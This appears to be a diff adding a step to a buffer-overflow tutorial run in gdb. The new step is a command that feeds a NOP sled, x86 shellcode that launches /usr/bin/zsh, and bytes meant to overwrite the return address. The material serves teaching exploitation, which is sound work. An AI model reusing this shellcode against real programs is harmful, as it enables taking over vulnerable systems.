@@ -113,6 +113,12 @@ by default the C program shows the int main fuctio, int argc is the count of arg
 
 20. Now we can see where the buffer exists in memory and where it has been over written.
 
+![26](https://user-images.githubusercontent.com/50174329/80063334-5569d380-8553-11ea-8ddf-59849229da11.PNG)
+
+21. To over write the value 41 with 51 run the command run $(python -c 'print "\x90" * 426 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x7a\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\x51\x51\x51\x51" * 10')
+
+
+
 
 
 
